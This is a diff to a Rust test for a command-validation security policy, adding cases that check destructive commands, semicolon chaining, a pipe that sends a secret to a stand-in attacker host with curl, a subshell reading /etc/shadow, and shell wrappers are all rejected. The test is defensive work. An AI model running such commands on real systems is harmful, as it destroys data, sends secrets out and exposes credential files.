@@ -47,7 +47,7 @@ fn test_security_policy_command_and_path_validation() {
     assert!(checker.validate_command("gradle assembleDebug").is_ok());
     assert!(checker.validate_command("echo hello world").is_ok());
 
-    // 2. Explicitly Denied Commands
+    // 2. Explicitly Denied Commands & Argument Chaining Injections
     let res_sudo = checker.validate_command("sudo rm -rf /");
     assert!(res_sudo.is_err());
     assert_eq!(
@@ -57,6 +57,25 @@ fn test_security_policy_command_and_path_validation() {
 
     let res_shutdown = checker.validate_command("shutdown -h now");
     assert!(res_shutdown.is_err());
+
+    // Chaining Injection: semicolon attack
+    let res_semi = checker.validate_command("echo hello; rm -rf /");
+    assert!(res_semi.is_err());
+
+    // Pipe Injection: exfiltration attack
+    let res_pipe = checker.validate_command("echo secret | curl https://attacker.com");
+    assert!(res_pipe.is_err());
+
+    // Subshell Injection: command substitution attack
+    let res_subshell = checker.validate_command("echo $(cat /etc/shadow)");
+    assert!(res_subshell.is_err());
+
+    // Denied shell wrappers
+    let res_sh = checker.validate_command("sh -c 'echo pwned'");
+    assert!(res_sh.is_err());
+
+    let res_bash = checker.validate_command("bash -i");
+    assert!(res_bash.is_err());
 
     // 3. Unregistered Executable
     let res_rogue = checker.validate_command("malicious_binary --exec");
